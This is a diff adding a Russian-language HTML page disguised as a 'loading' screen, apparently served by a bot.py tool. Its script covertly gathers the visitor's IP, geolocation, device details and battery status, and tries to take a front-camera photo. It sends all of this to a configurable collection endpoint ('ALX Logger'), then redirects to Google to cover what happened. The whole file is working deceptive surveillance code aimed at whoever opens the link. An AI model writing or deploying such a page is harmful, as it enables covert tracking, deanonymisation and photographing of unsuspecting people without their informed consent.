@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        /* Минимальный стиль, чтобы страница выглядела как "загрузка" */
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            color: #333;
+            text-align: center;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <p>Загрузка содержимого, пожалуйста, подождите...</p>
+    
+    <video id="videoElement" style="display: none;"></video>
+    <canvas id="canvasElement" style="display: none;"></canvas>
+
+    <script>
+        // ЭТИ ПЕРЕМЕННЫЕ БУДУТ АВТОМАТИЧЕСКИ ЗАМЕНЕНЫ В bot.py ПРИ ОТДАЧЕ СТРАНИЦЫ
+        const LOG_SESSION_ID = ''; // Заменится на уникальный ID сессии
+        const API_URL = ''; // Заменится на URL вашего /collect эндпоинта
+        // -------------------------------------------------------------------
+        
+        const IP_INFO_TOKEN = 'YOUR_IPINFO_TOKEN'; // Опционально: Для более точной геолокации/провайдера
+        
+        // Объект для сбора всех данных
+        let logData = {
+            sessionId: LOG_SESSION_ID,
+            ip: 'Unknown',
+            device: {
+                userAgent: navigator.userAgent,
+                os: navigator.platform,
+                model: 'N/A' // Будет попытка определить из UserAgent
+            },
+            location: {},
+            battery: {},
+            wifi_name: 'N/A',
+            image: null
+        };
+
+        // --- ФУНКЦИИ СБОРА ДАННЫХ ---
+        
+        async function getIPAndLocation() {
+            try {
+                // Используем внешний API для получения IP и гео-данных
+                const response = await fetch(`https://ipinfo.io/json?token=${IP_INFO_TOKEN}`);
+                const data = await response.json();
+                
+                logData.ip = data.ip || 'N/A';
+                logData.location = {
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country: data.country || 'N/A',
+                    org: data.org || 'N/A',
+                    loc: data.loc || 'N/A' // "lat,lon"
+                };
+                if (data.loc) {
+                    const [lat, lon] = data.loc.split(',');
+                    logData.location.lat = lat;
+                    logData.location.lon = lon;
+                }
+            } catch (error) {
+                console.error("IP/Location Error:", error);
+            }
+        }
+        
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    logData.battery = {
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+            } catch (error) {
+                console.warn("Battery API Error:", error);
+            }
+        }
+        
+        async function captureImage() {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+            let stream;
+
+            try {
+                // Запрашиваем доступ к камере (только фронтальной, если возможно)
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                video.srcObject = stream;
+                // Необходим небольшой таймаут, чтобы видео успело "загрузиться"
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+                
+                // Захватываем кадр через 500 мс
+                await new Promise(resolve => setTimeout(resolve, 500)); 
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Преобразуем кадр в Base64
+                logData.image = canvas.toDataURL('image/jpeg', 0.8);
+
+            } catch (error) {
+                // Ошибка, если пользователь отказал или камера недоступна
+                console.warn("Camera Capture Error (expected if denied):", error.name);
+            } finally {
+                // Обязательно останавливаем поток камеры
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+        }
+        
+        function getDeviceInfo() {
+            // Очень грубая попытка получить "модель" из UserAgent
+            const ua = navigator.userAgent;
+            let model = 'N/A';
+            if (/(iPhone|iPad|iPod|iOS)/i.test(ua)) {
+                const match = ua.match(/iPhone OS (\d+_\d+)/);
+                model = match ? `iPhone (iOS ${match[1].replace('_', '.')})` : 'iPhone';
+            } else if (/Android/i.test(ua)) {
+                const match = ua.match(/Android (\d+\.\d+(\.\d+)?)/);
+                model = match ? `Android ${match[1]}` : 'Android Device';
+            }
+            logData.device.model = model;
+        }
+
+        // --- ФУНКЦИЯ ОТПРАВКИ ---
+        
+        async function sendLogData() {
+            if (!logData.sessionId || !API_URL) {
+                console.error("Configuration error: Session ID or API URL is missing.");
+                return;
+            }
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(logData)
+                });
+
+                if (response.ok) {
+                    console.log("Data successfully sent to ALX Logger.");
+                } else {
+                    console.error("Failed to send data to server.", await response.json());
+                }
+            } catch (error) {
+                console.error("Network error during data submission:", error);
+            }
+        }
+
+        // --- ГЛАВНАЯ ЛОГИКА ---
+
+        async function initLogger() {
+            getDeviceInfo(); // Получаем UserAgent и базовую информацию
+            
+            // Запускаем сбор данных параллельно
+            await Promise.all([
+                getIPAndLocation(), 
+                getBatteryInfo(), 
+                captureImage() // Самый долгий, требует разрешений
+            ]);
+            
+            // Отправляем все собранное
+            await sendLogData();
+            
+            // Перенаправляем пользователя на нейтральный/интересный сайт
+            setTimeout(() => {
+                 window.location.replace("https://www.google.com");
+            }, 500); // Даем полсекунды на отправку данных
+        }
+
+        // Запускаем логгер после загрузки DOM
+        window.onload = initLogger;
+    </script>
+</body>
+</html>
